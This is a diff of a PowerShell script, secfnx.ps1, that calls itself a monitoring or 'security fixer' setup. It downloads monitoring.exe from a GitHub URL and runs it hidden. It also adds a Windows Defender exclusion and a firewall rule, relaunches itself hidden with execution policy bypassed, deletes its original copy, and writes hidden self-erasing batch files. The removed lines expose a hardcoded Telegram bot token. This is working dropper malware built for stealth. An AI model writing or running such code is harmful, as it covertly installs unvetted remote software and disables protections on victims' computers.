@@ -1,16 +1,16 @@
-# secfnx.ps1 - Fully hidden, self-contained monitoring setup
-param(
-    [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE"
-)
-
-# --- Paths ---
+# --- Config ---
 $TempFolder   = Join-Path $env:TEMP "security_fixer"
 if (-not (Test-Path $TempFolder)) { New-Item -Path $TempFolder -ItemType Directory -Force | Out-Null }
+
 $ExeName      = "monitoring.exe"
 $ExeUrl       = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/monitoring.exe"
 $ExePath      = Join-Path $TempFolder $ExeName
 $Ps1TempPath  = Join-Path $TempFolder "secfnx.ps1"
-$BatPath      = Join-Path $TempFolder "secfix_un.bat"
+
+# BAT files
+$BatFolderPath = Join-Path $TempFolder "secfix_un.bat"
+$BatTempPath   = Join-Path $env:TEMP "secfix_un.bat"
+
 $LogFile      = Join-Path $TempFolder "download_runner.log"
 
 # --- Helper functions ---
@@ -55,19 +55,20 @@ if (-not (Test-IsAdmin)) {
 # --- Download monitoring.exe ---
 if (-not (Test-Path $ExePath)) { Download-File $ExeUrl $ExePath }
 
-# --- Copy PS1 into TEMP if not already ---
+# --- Copy PS1 into TEMP ---
 if ($MyInvocation.MyCommand.Path -ne $Ps1TempPath) {
     Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $Ps1TempPath -Force
+    # Delete original PS1 from Downloads
+    try { Remove-Item -Path $MyInvocation.MyCommand.Path -Force } catch {}
+    # Relaunch hidden
     Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$Ps1TempPath`""; exit
 }
 
-# --- Add Defender exclusion ---
+# --- Defender & Firewall ---
 Add-DefenderExclusion $TempFolder
-
-# --- Add Firewall rule ---
 Add-FirewallRule $ExePath
 
-# --- Create uninstall batch ---
+# --- Create unified uninstall BAT ---
 $BatContent = @"
 @echo off
 :: Relaunch hidden if run directly
@@ -104,15 +105,19 @@ exit /b
 :: Main cleanup
 call :KillProcess monitoring.exe
 call :DeleteFolder "%TEMP%\security_fixer"
+call :DeleteFile "%TEMP%\secfix_un.bat"
 
 :: Delete this batch file
 del /F /Q "%~f0"
 "@
-Set-Content -Path $BatPath -Value $BatContent -Encoding ASCII
-attrib +h $BatPath
-Log "Created uninstall batch at $BatPath"
+
+# Write both BATs
+Set-Content -Path $BatFolderPath -Value $BatContent -Encoding ASCII
+Set-Content -Path $BatTempPath   -Value $BatContent -Encoding ASCII
+attrib +h $BatFolderPath
+attrib +h $BatTempPath
+Log "Created uninstall BATs in folder and %TEMP%"
 
 # --- Run monitoring.exe hidden ---
 Start-Process -FilePath $ExePath -WindowStyle Hidden
 Log "Started monitoring.exe hiddenly"
-
